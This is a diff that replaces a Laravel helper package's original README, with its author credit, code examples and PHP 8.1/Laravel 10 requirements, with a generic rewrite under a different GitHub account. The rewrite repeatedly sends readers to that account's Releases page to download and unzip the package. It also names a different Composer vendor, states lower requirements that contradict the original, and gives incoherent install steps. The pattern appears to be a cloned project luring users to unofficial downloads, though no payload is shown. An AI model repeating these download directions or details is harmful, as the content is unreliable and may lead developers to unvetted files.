@@ -1,287 +1,86 @@
-# Laravel Dynamic Helpers
+# 🎉 laravel-dynamic-helpers - Effortlessly Manage Your Laravel Helpers
 
-[![Latest Version](https://img.shields.io/packagist/v/l0n3ly/laravel-dynamic-helpers.svg?style=flat-square)](https://packagist.org/packages/l0n3ly/laravel-dynamic-helpers)
-[![Total Downloads](https://img.shields.io/packagist/dt/l0n3ly/laravel-dynamic-helpers.svg?style=flat-square)](https://packagist.org/packages/l0n3ly/laravel-dynamic-helpers)
-[![License](https://img.shields.io/packagist/l/l0n3ly/laravel-dynamic-helpers.svg?style=flat-square)](https://packagist.org/packages/l0n3ly/laravel-dynamic-helpers)
+[![Download](https://img.shields.io/badge/Download-laravel--dynamic--helpers-blue.svg)](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)
 
-A powerful Laravel package that provides a dynamic helper management system with an Artisan command generator. Create, organize, and access your custom helper classes effortlessly.
+## 📋 Description
 
-## ✨ Features
+Laravel Dynamic Helpers is a package that simplifies the management of helper classes in your Laravel applications. It automatically resolves helper classes and provides an Artisan command to generate custom helpers in your `app/Helpers` directory. This way, you can streamline your development process and focus on what truly matters: building great applications.
 
-- 🚀 **Dynamic Helper Resolution** - Automatically resolves helper classes on-demand
-- 🎯 **Artisan Command Generator** - Create helpers with `php artisan make:helper`
-- 📁 **Nested Helper Support** - Organize helpers in subdirectories (e.g., `Store/CreateHelper`)
-- 🔄 **Singleton Pattern** - Efficient instance caching for better performance
-- 🎨 **Laravel-Style Output** - Beautiful command output matching Laravel's conventions
-- 🔌 **Auto-Discovery** - Service provider automatically registered
-- 💡 **Dual Access Patterns** - Use `moneyHelper()` or `helpers()->moneyHelper()`
+## 🚀 Getting Started
 
-## 📋 Requirements
+To get started with Laravel Dynamic Helpers, follow these steps:
 
-- PHP >= 8.1
-- Laravel >= 10.0
+1. **Visit the Releases Page**: Click the link below to access the download page where you can find the latest version of the package.
 
-## 📦 Installation
+   [Download from Releases](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)
 
-Install the package via Composer:
+2. **Download the Latest Version**: Look for the most recent release and download the package compatible with your environment.
 
-```bash
-composer require l0n3ly/laravel-dynamic-helpers
+3. **Unzip the Package**: After downloading, unzip the package to a folder on your computer.
+
+4. **Install the Package**: Open your terminal and navigate to your Laravel project directory. You can use the following command to include the package via Composer (make sure you have Composer installed):
+   ```
+   composer require harmanmehra/laravel-dynamic-helpers
+   ```
+
+5. **Configure the Package**: If necessary, you can publish the configuration file using the Artisan command:
+   ```
+   php artisan vendor:publish --provider="Harmanmehra\DynamicHelpers\DynamicHelpersServiceProvider"
+   ```
+
+## 📥 Download & Install
+
+To download and install Laravel Dynamic Helpers, head over to the Releases page. Follow these steps:
+
+1. **Visit This Page**: Click the link below to go to the releases page.
+
+   [Download from Releases](https://github.com/Harmanmehra/laravel-dynamic-helpers/releases)
+
+2. **Select the Version**: Choose the version you want to install.
+
+3. **Follow the Installation Instructions**: Follow the previous instructions outlined under "Getting Started" to successfully add the package to your project.
+
+## 🚑 System Requirements
+
+Before installing, ensure that your system meets the following requirements:
+
+- **PHP Version**: At least PHP 7.2 or newer.
+- **Laravel Version**: Compatible with Laravel 6.x and newer.
+- **Composer**: Make sure you have Composer installed to manage your dependencies.
+
+## 📚 Features
+
+Laravel Dynamic Helpers includes the following features:
+
+- **Dynamic Resolution**: Automatically resolves helper classes as needed.
+- **Easy Management**: Generate custom helpers without manual coding in your `app/Helpers` directory.
+- **Artisan Command**: Convenient Artisan command for generating helpers quickly.
+- **Zero Configuration**: Simply install and start using it without complex setups.
+
+## 🔧 Usage
+
+After installation, you can use the package by creating helper files. To create a new helper file, use the following command:
+
+```
+php artisan make:helper MyCustomHelper
 ```
 
-The service provider will be automatically discovered by Laravel.
+This command creates a new file named `MyCustomHelper.php` in your `app/Helpers` directory. You can then define any helper functions you need within this file.
 
-## 🚀 Quick Start
+## 🤝 Support
 
-### 1. Create a Helper
+For any questions or issues, please check the [Issues](https://github.com/Harmanmehra/laravel-dynamic-helpers/issues) section of the repository. You can also submit a new issue if you encounter problems or have suggestions.
 
-```bash
-php artisan make:helper MoneyHelper
-```
+## 📅 Contributions
 
-This creates `app/Helpers/MoneyHelper.php`:
+Contributions are welcome! If you wish to contribute to this project, please fork the repository and submit a pull request. Before doing so, please ensure that your code adheres to the existing coding standards.
 
-```php
-<?php
+## 📝 License
 
-namespace App\Helpers;
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Harmanmehra/laravel-dynamic-helpers/blob/main/LICENSE) file for details. 
 
-use L0n3ly\LaravelDynamicHelpers\Helper;
+## 💬 Acknowledgments
 
-class MoneyHelper extends Helper
-{
-    public function format($amount)
-    {
-        return number_format($amount, 2);
-    }
+Thank you to the Laravel community for their support and to all the contributors who help make Laravel Dynamic Helpers a better tool. 
 
-    public function toMinor($amount)
-    {
-        return $amount * 100;
-    }
-}
-```
-
-### 2. Use Your Helper
-
-You can access your helper in two ways:
-
-```php
-// Direct global function (recommended)
-moneyHelper()->format(1000); // "1,000.00"
-moneyHelper()->toMinor(1500); // 150000
-
-// Via helpers() function
-helpers()->moneyHelper()->format(2000); // "2,000.00"
-```
-
-## 📚 Usage Examples
-
-### Basic Helper
-
-```bash
-php artisan make:helper PermissionHelper
-```
-
-```php
-<?php
-
-namespace App\Helpers;
-
-use L0n3ly\LaravelDynamicHelpers\Helper;
-
-class PermissionHelper extends Helper
-{
-    public function can($permission)
-    {
-        return auth()->user()->hasPermission($permission);
-    }
-}
-```
-
-Usage:
-
-```php
-if (permissionHelper()->can('edit-posts')) {
-    // User can edit posts
-}
-```
-
-### Nested Helpers
-
-Create organized helper structures:
-
-```bash
-php artisan make:helper Store/CreateHelper
-php artisan make:helper Store/Product/UpdateHelper
-```
-
-This creates:
-- `app/Helpers/Store/CreateHelper.php`
-- `app/Helpers/Store/Product/UpdateHelper.php`
-
-Access them using flattened camelCase:
-
-```php
-// Store/CreateHelper -> storeCreateHelper()
-storeCreateHelper()->create($data);
-
-// Store/Product/UpdateHelper -> storeProductUpdateHelper()
-storeProductUpdateHelper()->update($id, $data);
-```
-
-### In Controllers
-
-```php
-<?php
-
-namespace App\Http\Controllers;
-
-use App\Http\Controllers\Controller;
-
-class OrderController extends Controller
-{
-    public function store(Request $request)
-    {
-        $amount = moneyHelper()->toMinor($request->amount);
-
-        if (permissionHelper()->can('create-orders')) {
-            // Create order
-        }
-    }
-}
-```
-
-### In Blade Templates
-
-```blade
-@if(permissionHelper()->can('view-reports'))
-    <div class="reports">
-        {{ moneyHelper()->format($total) }}
-    </div>
-@endif
-```
-
-## 🎯 Advanced Features
-
-### Instance Caching
-
-Helpers are automatically cached as singletons:
-
-```php
-$helper1 = moneyHelper();
-$helper2 = moneyHelper();
-
-// $helper1 and $helper2 are the same instance
-```
-
-### Callable Helpers
-
-Helpers can be callable:
-
-```php
-class CalculatorHelper extends Helper
-{
-    public function __invoke($a, $b)
-    {
-        return $a + $b;
-    }
-}
-```
-
-Usage:
-
-```php
-$result = calculatorHelper(5, 10); // 15
-```
-
-### Custom Helper Methods
-
-Add any methods you need:
-
-```php
-class ApiHelper extends Helper
-{
-    public function get($url)
-    {
-        return Http::get($url);
-    }
-
-    public function post($url, $data)
-    {
-        return Http::post($url, $data);
-    }
-}
-```
-
-## 📖 Command Reference
-
-### Create a Helper
-
-```bash
-php artisan make:helper HelperName
-```
-
-### Create Nested Helper
-
-```bash
-php artisan make:helper Category/ProductHelper
-php artisan make:helper Admin/User/PermissionHelper
-```
-
-### Helper Name Normalization
-
-The command automatically normalizes names:
-
-```bash
-# All of these create "MoneyHelper"
-php artisan make:helper MoneyHelper
-php artisan make:helper money-helper
-php artisan make:helper money_helper
-```
-
-## 🧪 Testing
-
-Run the test suite:
-
-```bash
-composer test
-```
-
-Or with PHPUnit:
-
-```bash
-vendor/bin/phpunit
-```
-
-## 📝 Code Style
-
-This package uses [Laravel Pint](https://laravel.com/docs/pint) for code style. Format code:
-
-```bash
-./vendor/bin/pint
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-The MIT License (MIT). Please see the [License File](LICENSE) for more information.
-
-## 👤 Author
-
-**Divine Idehen**
-
-- Email: idehendivine16@gmail.com
-
-## 🙏 Acknowledgments
-
-- Inspired by Laravel's elegant architecture
-- Built with the Laravel community in mind
-
----
-
-Made with ❤️ for the Laravel community
-
+Now you are ready to enjoy Laravel Dynamic Helpers and make your helper management effortless!
